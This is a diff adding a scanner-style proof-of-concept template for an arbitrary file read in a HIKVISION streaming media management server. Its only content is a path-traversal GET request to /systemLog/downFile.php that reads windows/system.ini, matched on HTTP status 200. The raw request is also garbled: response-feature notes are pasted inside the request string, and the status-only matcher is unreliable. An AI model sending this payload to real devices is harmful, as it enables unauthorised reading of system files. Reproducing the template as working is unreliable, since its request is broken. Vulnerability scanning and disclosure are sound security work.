@@ -1,0 +1,34 @@
+id: poc-gq959ge7g299wgts
+info:
+  name: HIKVISION 流媒体管理服务器后台任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gq959ge7g299wgts'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gq959ge7g299wgts
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    support
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
